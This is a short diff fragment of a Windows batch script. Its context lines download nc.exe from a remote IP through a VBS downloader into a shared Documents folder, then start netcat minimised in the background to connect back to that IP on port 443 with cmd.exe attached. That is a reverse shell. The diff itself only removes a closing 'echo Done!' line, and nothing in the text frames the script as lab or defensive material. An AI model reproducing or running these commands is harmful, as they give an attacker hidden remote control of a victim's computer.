@@ -19,4 +19,3 @@ timeout 1
 dl.vbs "http://1.1.1.1/nc.exe" "c:\Documents and Settings\All Users\Documents\nc.exe"
 timeout 1
 start "nc" /d "c:\Documents and Settings\All Users\Documents\" /min /b "c:\Documents and Settings\All Users\Documents\nc.exe" -nv 1.1.1.1 443 -e cmd.exe
-echo Done!
